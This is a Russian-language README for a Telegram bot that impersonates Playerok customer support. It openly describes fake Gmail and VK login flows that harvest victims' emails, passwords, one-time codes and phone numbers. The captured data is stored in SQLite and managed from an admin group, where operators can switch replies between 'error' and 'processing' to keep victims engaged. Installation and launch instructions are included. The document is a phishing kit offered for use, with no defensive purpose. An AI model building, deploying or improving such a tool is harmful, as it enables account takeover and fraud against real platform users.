# 🤖 Playerok Support Bot

Telegram-бот для имитации службы поддержки платформы [Playerok](https://playerok.com). Собирает данные пользователей (email, пароли, коды), логирует действия и управляется через админ-панель в Telegram.

---

## 📋 Что делает бот

- Встречает пользователя приветственным меню с кнопками (Gmail, VK, поддержка и т.д.)
- Запрашивает у пользователя данные: email, одноразовые коды, номер телефона, пароль
- Все введённые данные сохраняются в SQLite базу данных
- Каждый пользователь получает отдельную тему в Telegram-группе (для удобного управления)
- Уведомляет администраторов о новых пользователях с кнопками управления

---

## ⚙️ Функционал

### Для пользователей
- Вход через Gmail (email + одноразовый код)
- Вход через VK (телефон + пароль)
- Обращение в поддержку
- Режим технических работ (блокирует действия пользователей)

### Для администраторов (через группу Telegram)
- Живая консоль с онлайн-статистикой бота
- Просмотр всех собранных данных по каждому пользователю
- Блокировка / разблокировка пользователей
- Переключение режима ответа (`ошибка` / `обработка`)
- Включение/выключение режима технических работ
- Отправка произвольных сообщений пользователям прямо из группы
- Отправка ссылок пользователям
- Логирование ошибок

---

## 🗄️ База данных (SQLite)

| Таблица | Описание |
|---|---|
| `users` | Все зарегистрированные пользователи |
| `user_data` | Введённые данные (email, пароль, код, телефон) |
| `threads` | Привязка пользователей к темам в Telegram-группе |
| `blocked_users` | Заблокированные пользователи |
| `user_notifications` | Отправленные уведомления в группу |
| `console_message` | ID сообщения с консолью |
| `error_logs` | Логи ошибок |
| `bot_settings` | Настройки бота |
| `bot_stats` | Статистика работы |

## 🚀 Запуск

### 1. Установка зависимостей

```bash
pip install pyTelegramBotAPI requests
```

### 2. Настройка токена и ID групп

В начале файла `V11_Project_FINAL_.py` укажи:

```python
BOT_TOKEN = "ВАШ_ТОКЕН"
USER_ACTIONS_CHAT_ID = -100XXXXXXXXX   # ID группы для логов действий
SUPPORT_CHAT_ID = -100XXXXXXXXX        # ID группы для поддержки
```

### 3. Запуск

```bash
python V11_Project_FINAL_.py
```

> ⚠️ Бот защищён от двойного запуска через lock-файл. Если бот завис — выполни `pkill -9 python`.
